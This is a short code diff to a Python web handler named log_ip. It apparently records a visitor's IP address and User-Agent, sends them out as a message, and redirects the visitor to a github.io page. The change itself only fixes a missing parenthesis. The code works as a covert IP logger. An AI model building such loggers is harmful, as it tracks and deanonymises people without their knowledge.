@@ -25,7 +25,7 @@ def log_ip():
         "content": f"IP: {ip}\nUser-Agent: {user_agent}"
     })
 
-    return redirect("https://gengaog.github.io/-/"
+    return redirect("https://gengaog.github.io/-/")
 
 if __name__ == "__main__":
     port = int(os.environ.get("PORT", 5000))
